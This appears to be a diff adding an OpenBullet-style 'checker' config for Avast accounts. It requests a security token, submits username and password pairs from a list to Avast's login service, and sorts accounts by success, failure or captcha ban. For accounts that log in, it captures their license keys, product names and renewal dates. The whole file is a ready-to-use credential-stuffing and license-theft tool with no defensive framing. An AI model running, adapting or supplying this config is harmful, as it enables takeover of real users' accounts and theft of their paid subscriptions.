@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "AVAST",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-11T21:28:42.4820372-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://id.avast.com/service/single/MetaService/securityToken" 
+  CONTENT "{\"correlationId\":1,\"operationName\":\"securityToken\",\"payload\":[],\"serviceName\":\"MetaService\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "operationResult\":\"" "\"" -> VAR "T" 
+
+REQUEST POST "https://id.avast.com/service/single/LoginService/login?target=https%3A%2F%2Fmy.avast.com%2F" 
+  CONTENT "{\"correlationId\":4,\"operationName\":\"login\",\"payload\":[{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"rememberMe\":true,\"captcha_response\":\"NOTREQUIRED\"},{\"allowAuthenticated\":false,\"extraLoginTicket\":false}],\"securityToken\":\"<T>\",\"serviceName\":\"LoginService\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Ban OR 
+    KEY "server.error.captchaRequired" 
+
+REQUEST POST "https://my-web.avast.com/v1/query/get-all-user-licenses" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: my-web.avast.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 0" 
+  HEADER "vaar-version: 0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" 
+  HEADER "vaar-header-client-build-version: 2.2.96" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://subscriptions.avast.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://subscriptions.avast.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" LR "WALLET_KEY\",\"value\":\"" "\"" Recursive=TRUE -> VAR "KEY" 
+
+UTILITY List "KEY" RemoveDuplicates -> CAP "KEY" 
+
+PARSE "<SOURCE>" LR "product." "\"" Recursive=TRUE -> VAR "NAME" 
+
+PARSE "<SOURCE>" LR "nextCharge\":" "," Recursive=TRUE -> VAR "NEXT" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd" "<NEXT[*]>" -> VAR "DATES" 
+
+FUNCTION Constant "<NAME[*]> - <DATES[*]>" -> VAR "3" 
+
+UTILITY List "3" RemoveValues Contains " - NULL" -> VAR "1" 
+
+UTILITY List "1" RemoveValues Contains " - 1970-01-01" -> CAP "PRODUCTS" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<KEY>" EqualTo "[]" 
+    KEY "<PRODUCTS>" EqualTo "[]" 
+  KEYCHAIN Success AND 
+    KEY "<KEY>" NotEqualTo "[]" 
+    KEY "<PRODUCTS>" NotEqualTo "[]" 
+
